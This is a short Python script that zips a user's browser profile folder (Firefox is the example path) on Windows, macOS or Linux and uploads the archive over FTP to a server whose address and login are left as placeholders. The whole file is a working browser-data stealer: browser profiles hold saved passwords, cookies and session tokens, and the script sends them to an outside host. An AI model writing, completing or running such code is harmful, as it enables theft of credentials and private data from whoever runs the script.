#!/usr/bin/python3
# {PATH TO BROWSER} - change this to the path to your browser - on every system are different paths e.g. 'AppData\\Roaming\\Mozilla\\Firefox'

import os, sys, shutil, ftplib

if sys.platform == "win32" or sys.platform == "cygwin":
    path = os.path.join(os.getenv("HOME"), "{PATH TO BROWSER}")

elif sys.platform == "darwin":
    path = os.path.join(os.getenv("HOME"), "{PATH TO BROWSER}")

else:
    path = os.path.join(os.getenv("HOME"), "{PATH TO BROWSER}")

# Zip the folder
fname = "data"
shutil.make_archive(fname, 'zip', path)

# Upload the zip file to the server
with ftplib.FTP('{SERVER}', '{USER}', '{PASSWORD}') as conn:
    with open(fname + '.zip', 'rb') as f:
        conn.storbinary('STOR ' + fname + '.zip', f)
